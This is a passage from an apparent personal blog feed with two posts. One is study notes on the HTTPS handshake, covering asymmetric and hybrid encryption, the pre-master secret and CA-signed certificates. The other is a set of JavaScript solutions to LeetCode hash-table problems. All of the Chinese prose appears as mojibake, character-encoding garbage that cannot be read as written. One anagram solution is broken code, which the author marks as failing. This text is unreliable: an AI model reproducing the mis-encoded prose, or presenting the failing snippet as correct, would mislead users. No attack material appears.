å¯†é’¥æ¥åŠ å¯†ï¼Œé‚£ä¹ˆåªèƒ½ç”¨ A å¯†é’¥æ¥è§£å¯†ã€‚</p><p>åœ¨ HTTPS ä¸­ï¼ŒæœåŠ¡å™¨ä¼šå°†å…¶ä¸­çš„ä¸€ä¸ªå¯†é’¥é€šè¿‡æ˜æ–‡çš„å½¢å¼å‘é€ç»™æµè§ˆå™¨ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªå¯†é’¥ç§°ä¸º<strong>å…¬é’¥</strong>ï¼ŒæœåŠ¡å™¨è‡ªå·±ç•™ä¸‹çš„é‚£ä¸ªå¯†é’¥ç§°ä¸º<strong>ç§é’¥</strong>ã€‚é¡¾åæ€ä¹‰ï¼Œ<strong>å…¬é’¥æ˜¯æ¯ä¸ªäººéƒ½èƒ½è·å–åˆ°çš„ï¼Œè€Œç§é’¥åªæœ‰æœåŠ¡å™¨æ‰èƒ½çŸ¥é“ï¼Œä¸å¯¹ä»»ä½•äººå…¬å¼€ã€‚</strong>ä¸‹å›¾æ˜¯ä½¿ç”¨éå¯¹ç§°åŠ å¯†æ”¹é€ çš„ HTTPS åè®®ï¼š<img src="https://i.loli.net/2021/06/15/lWts4AkF5TRNS1X.jpg" alt="Snipaste_2021-06-15_16-39-33.jpg"></p><p>æ ¹æ®è¯¥å›¾ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸‹ä½¿ç”¨éå¯¹ç§°åŠ å¯†çš„è¯·æ±‚æµç¨‹ã€‚</p><ul><li>é¦–å…ˆæµè§ˆå™¨è¿˜æ˜¯å‘é€åŠ å¯†å¥—ä»¶åˆ—è¡¨ç»™æœåŠ¡å™¨ã€‚</li><li>ç„¶åæœåŠ¡å™¨ä¼šé€‰æ‹©ä¸€ä¸ªåŠ å¯†å¥—ä»¶ï¼Œä¸è¿‡å’Œå¯¹ç§°åŠ å¯†ä¸åŒçš„æ˜¯ï¼Œä½¿ç”¨éå¯¹ç§°åŠ å¯†æ—¶æœåŠ¡å™¨ä¸Šéœ€è¦æœ‰ç”¨äºæµè§ˆå™¨åŠ å¯†çš„å…¬é’¥å’ŒæœåŠ¡å™¨è§£å¯† HTTP æ•°æ®çš„ç§é’¥ï¼Œç”±äºå…¬é’¥æ˜¯ç»™æµè§ˆå™¨åŠ å¯†ä½¿ç”¨çš„ï¼Œå› æ­¤æœåŠ¡å™¨ä¼šå°†åŠ å¯†å¥—ä»¶å’Œå…¬é’¥ä¸€é“å‘é€ç»™æµè§ˆå™¨ã€‚</li><li>æœ€åå°±æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨è¿”å›ç¡®è®¤æ¶ˆæ¯ã€‚</li></ul><p>è¿™æ ·æµè§ˆå™¨ç«¯å°±æœ‰äº†æœåŠ¡å™¨çš„å…¬é’¥ï¼Œåœ¨æµè§ˆå™¨ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€æ•°æ®æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥å…¬é’¥æ¥åŠ å¯†æ•°æ®ã€‚ç”±äºå…¬é’¥åŠ å¯†çš„æ•°æ®åªæœ‰ç§é’¥æ‰èƒ½è§£å¯†ï¼Œæ‰€ä»¥å³ä¾¿é»‘å®¢æˆªè·äº†æ•°æ®å’Œå…¬é’¥ï¼Œä»–ä¹Ÿæ˜¯æ— æ³•ä½¿ç”¨å…¬é’¥æ¥è§£å¯†æ•°æ®çš„ã€‚è¿™çœ‹ä¸Šå»ä¼¼ä¹å¾ˆå®Œç¾ï¼Œä¸è¿‡è¿™ç§æ–¹å¼ä¾ç„¶å­˜åœ¨<strong>ä¸¤ä¸ªä¸¥é‡çš„é—®é¢˜ï¼š</strong></p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯<strong>éå¯¹ç§°åŠ å¯†çš„æ•ˆç‡å¤ªä½</strong>ã€‚è¿™ä¼šä¸¥é‡å½±å“åˆ°åŠ è§£å¯†æ•°æ®çš„é€Ÿåº¦ï¼Œè¿›è€Œå½±å“åˆ°ç”¨æˆ·æ‰“å¼€é¡µé¢çš„é€Ÿåº¦ã€‚</li><li>ç¬¬äºŒä¸ªæ˜¯<strong>æ— æ³•ä¿è¯æœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„æ•°æ®å®‰å…¨</strong>ã€‚è™½ç„¶æµè§ˆå™¨ç«¯å¯ä»¥ä½¿ç”¨å…¬é’¥æ¥åŠ å¯†ï¼Œä½†æ˜¯æœåŠ¡å™¨ç«¯åªèƒ½é‡‡ç”¨ç§é’¥æ¥åŠ å¯†ï¼Œç§é’¥åŠ å¯†åªæœ‰å…¬é’¥èƒ½è§£å¯†ï¼Œä½†é»‘å®¢ä¹Ÿæ˜¯å¯ä»¥è·å–å¾—åˆ°å…¬é’¥çš„ï¼Œè¿™æ ·å°±ä¸èƒ½ä¿è¯æœåŠ¡å™¨ç«¯æ•°æ®çš„å®‰å…¨äº†ã€‚</li></ul><h4 id="ç¬¬ä¸‰ç‰ˆï¼šå¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†æ­é…ä½¿ç”¨"><a href="#ç¬¬ä¸‰ç‰ˆï¼šå¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†æ­é…ä½¿ç”¨" class="headerlink" title="ç¬¬ä¸‰ç‰ˆï¼šå¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†æ­é…ä½¿ç”¨"></a>ç¬¬ä¸‰ç‰ˆï¼šå¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†æ­é…ä½¿ç”¨</h4><p>åœ¨ä¼ è¾“æ•°æ®é˜¶æ®µä¾ç„¶ä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼Œä½†æ˜¯å¯¹ç§°åŠ å¯†çš„å¯†é’¥æˆ‘ä»¬é‡‡ç”¨éå¯¹ç§°åŠ å¯†æ¥ä¼ è¾“ã€‚</p><p><img src="https://i.loli.net/2021/06/15/Q6Hcv57OfNe3L4V.jpg" alt="Snipaste_2021-06-15_16-40-58.jpg"></p><p>æ”¹é€ åçš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><ul><li>é¦–å…ˆæµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€å¯¹ç§°åŠ å¯†å¥—ä»¶åˆ—è¡¨ã€éå¯¹ç§°åŠ å¯†å¥—ä»¶åˆ—è¡¨å’Œéšæœºæ•° client-randomï¼›</li><li>æœåŠ¡å™¨ä¿å­˜éšæœºæ•° client-randomï¼Œé€‰æ‹©å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†çš„å¥—ä»¶ï¼Œç„¶åç”Ÿæˆéšæœºæ•° service-randomï¼Œå‘æµè§ˆå™¨å‘é€é€‰æ‹©çš„åŠ å¯†å¥—ä»¶ã€service-random å’Œå…¬é’¥ï¼›</li><li>æµè§ˆå™¨ä¿å­˜å…¬é’¥ï¼Œå¹¶ç”Ÿæˆéšæœºæ•° pre-masterï¼Œç„¶ååˆ©ç”¨å…¬é’¥å¯¹ pre-master åŠ å¯†ï¼Œå¹¶å‘æœåŠ¡å™¨å‘é€åŠ å¯†åçš„æ•°æ®ï¼›</li><li>æœ€åæœåŠ¡å™¨æ‹¿å‡ºè‡ªå·±çš„ç§é’¥ï¼Œè§£å¯†å‡º pre-master æ•°æ®ï¼Œå¹¶è¿”å›ç¡®è®¤æ¶ˆæ¯ã€‚</li></ul><p>åˆ°æ­¤ä¸ºæ­¢ï¼ŒæœåŠ¡å™¨å’Œæµè§ˆå™¨å°±æœ‰äº†å…±åŒçš„ client-randomã€service-random å’Œ pre-masterï¼Œç„¶åæœåŠ¡å™¨å’Œæµè§ˆå™¨ä¼šä½¿ç”¨è¿™ä¸‰ç»„éšæœºæ•°ç”Ÿæˆå¯¹ç§°å¯†é’¥ï¼Œå› ä¸ºæœåŠ¡å™¨å’Œæµè§ˆå™¨ä½¿ç”¨åŒä¸€å¥—æ–¹æ³•æ¥ç”Ÿæˆå¯†é’¥ï¼Œæ‰€ä»¥æœ€ç»ˆç”Ÿæˆçš„å¯†é’¥ä¹Ÿæ˜¯ç›¸åŒçš„ã€‚æœ‰äº†å¯¹ç§°åŠ å¯†çš„å¯†é’¥ä¹‹åï¼ŒåŒæ–¹å°±å¯ä»¥ä½¿ç”¨å¯¹ç§°åŠ å¯†çš„æ–¹å¼æ¥ä¼ è¾“æ•°æ®äº†ã€‚</p><p>éœ€è¦ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹ï¼Œ<strong>pre-master æ˜¯ç»è¿‡å…¬é’¥åŠ å¯†ä¹‹åä¼ è¾“çš„ï¼Œæ‰€ä»¥é»‘å®¢æ— æ³•è·å–åˆ° pre-masterï¼Œè¿™æ ·é»‘å®¢å°±æ— æ³•ç”Ÿæˆå¯†é’¥ï¼Œä¹Ÿå°±ä¿è¯äº†é»‘å®¢æ— æ³•ç ´è§£ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•°æ®äº†ã€‚</strong></p><h4 id="ç¬¬å››ç‰ˆï¼šæ·»åŠ æ•°å­—è¯ä¹¦"><a href="#ç¬¬å››ç‰ˆï¼šæ·»åŠ æ•°å­—è¯ä¹¦" class="headerlink" title="ç¬¬å››ç‰ˆï¼šæ·»åŠ æ•°å­—è¯ä¹¦"></a>ç¬¬å››ç‰ˆï¼šæ·»åŠ æ•°å­—è¯ä¹¦</h4><p><strong>æƒå¨æœºæ„ CA</strong>ï¼ˆCertificate Authorityï¼‰ï¼Œé¢å‘<strong>æ•°å­—è¯ä¹¦</strong>ï¼ˆDigital Certificate)ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•°å­—è¯ä¹¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼šä¸€ä¸ªæ˜¯é€šè¿‡æ•°å­—è¯ä¹¦å‘æµè§ˆå™¨è¯æ˜æœåŠ¡å™¨çš„èº«ä»½ï¼Œå¦ä¸€ä¸ªæ˜¯æ•°å­—è¯ä¹¦é‡Œé¢åŒ…å«äº†æœåŠ¡å™¨å…¬é’¥ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å«æœ‰æ•°å­—è¯ä¹¦çš„ HTTPS çš„è¯·æ±‚æµç¨‹ï¼Œä½ å¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/15/QSE6I2dqFk51Hui.jpg" alt="Snipaste_2021-06-15_16-44-01.jpg"></p><p>ç›¸è¾ƒäºç¬¬ä¸‰ç‰ˆçš„ HTTPS åè®®ï¼Œè¿™é‡Œä¸»è¦æœ‰ä¸¤ç‚¹æ”¹å˜ï¼š</p><ul><li>æœåŠ¡å™¨æ²¡æœ‰ç›´æ¥è¿”å›å…¬é’¥ç»™æµè§ˆå™¨ï¼Œè€Œæ˜¯è¿”å›äº†æ•°å­—è¯ä¹¦ï¼Œè€Œå…¬é’¥æ­£æ˜¯åŒ…å«åœ¨æ•°å­—è¯ä¹¦ä¸­çš„ï¼›</li><li>åœ¨æµè§ˆå™¨ç«¯å¤šäº†ä¸€ä¸ªè¯ä¹¦éªŒè¯çš„æ“ä½œï¼ŒéªŒè¯äº†è¯ä¹¦ä¹‹åï¼Œæ‰ç»§ç»­åç»­æµç¨‹ã€‚</li></ul><p>é€šè¿‡å¼•å…¥æ•°å­—è¯ä¹¦ï¼Œæˆ‘ä»¬å°±å®ç°äº†æœåŠ¡å™¨çš„èº«ä»½è®¤è¯åŠŸèƒ½ï¼Œè¿™æ ·å³ä¾¿é»‘å®¢ä¼ªé€ äº†æœåŠ¡å™¨ï¼Œä½†æ˜¯ç”±äºè¯ä¹¦æ˜¯æ²¡æœ‰åŠæ³•ä¼ªé€ çš„ï¼Œæ‰€ä»¥ä¾ç„¶æ— æ³•æ¬ºéª—ç”¨æˆ·ã€‚</p><h3 id="æ•°å­—è¯ä¹¦çš„ç”³è¯·å’ŒéªŒè¯"><a href="#æ•°å­—è¯ä¹¦çš„ç”³è¯·å’ŒéªŒè¯" class="headerlink" title="æ•°å­—è¯ä¹¦çš„ç”³è¯·å’ŒéªŒè¯"></a>æ•°å­—è¯ä¹¦çš„ç”³è¯·å’ŒéªŒè¯</h3><p>é€šå¸¸çš„ç”³è¯·æµç¨‹åˆ†ä»¥ä¸‹å‡ æ­¥ï¼š</p><ul><li>é¦–å…ˆæå®¢æ—¶é—´éœ€è¦å‡†å¤‡ä¸€å¥—ç§é’¥å’Œå…¬é’¥ï¼Œç§é’¥ç•™ç€è‡ªå·±ä½¿ç”¨ï¼›</li><li>ç„¶åæå®¢æ—¶é—´å‘ CA æœºæ„æäº¤å…¬é’¥ã€å…¬å¸ã€ç«™ç‚¹ç­‰ä¿¡æ¯å¹¶ç­‰å¾…è®¤è¯ï¼Œè¿™ä¸ªè®¤è¯è¿‡ç¨‹å¯èƒ½æ˜¯æ”¶è´¹çš„ï¼›</li><li>CA é€šè¿‡çº¿ä¸Šã€çº¿ä¸‹ç­‰å¤šç§æ¸ é“æ¥éªŒè¯æå®¢æ—¶é—´æ‰€æä¾›ä¿¡æ¯çš„çœŸå®æ€§ï¼Œå¦‚å…¬å¸æ˜¯å¦å­˜åœ¨ã€ä¼ä¸šæ˜¯å¦åˆæ³•ã€åŸŸåæ˜¯å¦å½’å±è¯¥ä¼ä¸šç­‰ï¼›</li><li>å¦‚ä¿¡æ¯å®¡æ ¸é€šè¿‡ï¼ŒCA ä¼šå‘æå®¢æ—¶é—´ç­¾å‘è®¤è¯çš„æ•°å­—è¯ä¹¦ï¼ŒåŒ…å«äº†æå®¢æ—¶é—´çš„å…¬é’¥ã€ç»„ç»‡ä¿¡æ¯ã€CA çš„ä¿¡æ¯ã€æœ‰æ•ˆæ—¶é—´ã€è¯ä¹¦åºåˆ—å·ç­‰ï¼Œè¿™äº›ä¿¡æ¯éƒ½æ˜¯æ˜æ–‡çš„ï¼ŒåŒæ—¶åŒ…å«ä¸€ä¸ª CA ç”Ÿæˆçš„ç­¾åã€‚</li></ul><p>æœ€åä¸€æ­¥æ•°å­—ç­¾åçš„è¿‡ç¨‹ï¼šé¦–å…ˆ CA ä½¿ç”¨ <strong>Hash å‡½æ•°</strong>æ¥è®¡ç®—æå®¢æ—¶é—´æäº¤çš„æ˜æ–‡ä¿¡æ¯ï¼Œå¹¶å¾—å‡º<strong>ä¿¡æ¯æ‘˜è¦</strong>ï¼›ç„¶å CA å†ä½¿ç”¨å®ƒçš„ç§é’¥å¯¹ä¿¡æ¯æ‘˜è¦è¿›è¡ŒåŠ å¯†ï¼Œ<strong>åŠ å¯†åçš„å¯†æ–‡å°±æ˜¯ CA é¢ç»™æå®¢æ—¶é—´çš„æ•°å­—ç­¾å</strong>ã€‚</p><p>æµè§ˆå™¨æ¥æ”¶åˆ°æ•°å­—è¯ä¹¦ä¹‹åï¼Œä¼šå¯¹æ•°å­—è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼š</p><ul><li>é¦–å…ˆæµè§ˆå™¨è¯»å–è¯ä¹¦ä¸­ç›¸å…³çš„æ˜æ–‡ä¿¡æ¯ï¼Œé‡‡ç”¨ CA ç­¾åæ—¶ç›¸åŒçš„ Hash å‡½æ•°æ¥è®¡ç®—å¹¶å¾—åˆ°ä¿¡æ¯æ‘˜è¦ Aï¼›</li><li>ç„¶åå†åˆ©ç”¨å¯¹åº” CA çš„å…¬é’¥è§£å¯†ç­¾åæ•°æ®ï¼Œå¾—åˆ°ä¿¡æ¯æ‘˜è¦ Bï¼›</li><li>å¯¹æ¯”ä¿¡æ¯æ‘˜è¦ A å’Œä¿¡æ¯æ‘˜è¦ Bï¼Œå¦‚æœä¸€è‡´ï¼Œåˆ™å¯ä»¥ç¡®è®¤è¯ä¹¦æ˜¯åˆæ³•çš„ï¼Œå³è¯æ˜äº†è¿™ä¸ªæœåŠ¡å™¨æ˜¯æå®¢æ—¶é—´çš„ï¼›</li><li>åŒæ—¶æµè§ˆå™¨è¿˜ä¼šéªŒè¯è¯ä¹¦ç›¸å…³çš„åŸŸåä¿¡æ¯ã€æœ‰æ•ˆæ—¶é—´ç­‰ä¿¡æ¯ã€‚</li></ul><p>åœ¨ç”³è¯·å’Œä½¿ç”¨è¯ä¹¦çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜éœ€è¦æ³¨æ„ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ol><li>ç”³è¯·æ•°å­—è¯ä¹¦æ˜¯ä¸éœ€è¦æä¾›ç§é’¥çš„ï¼Œè¦ç¡®ä¿ç§é’¥æ°¸è¿œåªèƒ½ç”±æœåŠ¡å™¨æŒæ¡ï¼›</li><li>æ•°å­—è¯ä¹¦æœ€æ ¸å¿ƒçš„æ˜¯ CA ä½¿ç”¨å®ƒçš„ç§é’¥ç”Ÿæˆçš„æ•°å­—ç­¾åï¼›</li><li>å†…ç½® CA å¯¹åº”çš„è¯ä¹¦ç§°ä¸ºæ ¹è¯ä¹¦ï¼Œæ ¹è¯ä¹¦æ˜¯æœ€æƒå¨çš„æœºæ„ï¼Œå®ƒä»¬è‡ªå·±ä¸ºè‡ªå·±ç­¾åï¼Œæˆ‘ä»¬æŠŠè¿™ç§°ä¸ºè‡ªç­¾åè¯ä¹¦ã€‚</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯&lt;a href=&quot;https://time.geekbang.org/column/intro/100033601&quot;&gt;æå®¢æ—¶é—´â€”â€”æµè§ˆ</summary>
      
    
    
    
    <category term="é˜…è¯»ç¬”è®°" scheme="http://example.com/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="æµè§ˆå™¨å·¥ä½œåŸç†" scheme="http://example.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ•°æ®ç»“æ„ã€‘â€” â€” å“ˆå¸Œè¡¨</title>
    <link href="http://example.com/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
    <id>http://example.com/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E5%93%88%E5%B8%8C%E8%A1%A8/</id>
    <published>2021-06-11T19:42:57.000Z</published>
    <updated>2021-08-13T08:11:44.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><h2 id="LeetCode1â€”â€”ä¸¤æ•°ä¹‹å’Œï¼ˆâ˜†ï¼‰"><a href="#LeetCode1â€”â€”ä¸¤æ•°ä¹‹å’Œï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode1â€”â€”ä¸¤æ•°ä¹‹å’Œï¼ˆâ˜†ï¼‰"></a>LeetCode1â€”â€”ä¸¤æ•°ä¹‹å’Œï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/two-sum/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç "><a href="#è‡ªå·±çš„ä»£ç " class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å•çº¯ç»ƒä¸€ä¸‹ mapï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.has(target-nums[i]))&#123;</span><br><span class="line">            <span class="keyword">return</span> [map.get(target-nums[i]),i]</span><br><span class="line">        &#125;</span><br><span class="line">        map.set(nums[i],i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰"><a href="#LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰"></a>LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/valid-anagram/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -1"><a href="#è‡ªå·±çš„ä»£ç -1" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æ’åºåå†æ¯”è¾ƒè¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œé‡ç‚¹æ˜¯ç”¨ Map ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s1=s.split(<span class="string">&quot;&quot;</span>).sort().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> t1=t.split(<span class="string">&quot;&quot;</span>).sort().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> s1===t1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// mapï¼ˆæ²¡è¿‡ï¼‰</span></span><br><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(), s1 = s.split(<span class="string">&#x27;&#x27;</span>), t1 = t.split(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (map[s1[i]]) &#123;</span><br><span class="line">      map[s1[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    map.set(s1[i], <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; t1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (map[t1[i]]) &#123;</span><br><span class="line">      map[t1[i]]--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> !map.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åŸæ¥åªè¦æ–°å»º map æ—¶ä»¤å®ƒä¸º {} å°±è¡Œã€‚å¦‚æœæ˜¯ new Mapï¼Œå°±æ¶‰åŠåˆ° has get set ç­‰ api ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£"><a href="#æ€è·¯-amp-é¢˜è§£" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>æ³¨æ„ map ä¸èƒ½ç›´æ¥ <code>map[i]++</code> ï¼›å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥ for of ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (t.length !== s.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> counts = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> s) &#123;</span><br><span class="line">        <span class="comment">// å­¦èµ·æ¥ï¼</span></span><br><span class="line">        counts[c] = (counts[c] || <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> t) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!counts[c]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        counts[c]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ç¬¬äºŒç§å†™æ³•</span></span><br><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length !== t.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        map[s[i]] ? map[s[i]]++ : map[s[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; t.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map[t[i]]) map[t[i]]--;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode49â€”â€”å­—æ¯å¼‚ä½è¯åˆ†ç»„ï¼ˆâ˜†â˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -2"><a href="#è‡ªå·±çš„ä»£ç -2" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> groupAnagrams = <span class="function"><span class="keyword">function</span> (<span class="params">strs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = &#123;&#125;, res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> strs) &#123;</span><br><span class="line">    <span class="keyword">let</span> str = i.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    map[str] ? map[str].push(i) : map[str] = [i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> map) &#123;</span><br><span class="line">    res.push(map[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¶çƒ­æ‰“é“è¿˜æ˜¯èƒ½å†™å‡ºæ¥çš„å“ˆå“ˆã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-1"><a href="#æ€è·¯-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>å¥½åƒæ˜¯æ¯”è¾ƒç®€ä¾¿çš„æ–¹æ³•äº†ï¼Œä½†æ˜¯æœ€åè¾“å‡ºæ—¶å®Œå…¨å¯ä»¥è¿™æ ·ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">Object</span>.values(map);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;a href=&quot;#çŸ¥è¯†ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;/a&gt;çŸ¥è¯†ç‚¹&lt;/h1&gt;&lt;h2 id=&quot;LeetCode1â€”â€”ä¸¤æ•°ä¹‹å’Œï¼ˆâ˜†ï¼‰&quot;&gt;&lt;a href=&quot;#LeetCode1â€”â€”ä¸¤æ•°ä¹‹å’Œï¼ˆâ˜†ï¼‰&quot; class=&quot;head</summary>
      
    
    
    
    <category term="æ•°æ®ç»“æ„" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="å“ˆå¸Œè¡¨" scheme="http://example.com/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ•°æ®ç»“æ„ã€‘â€” â€” äºŒå‰æ ‘</title>
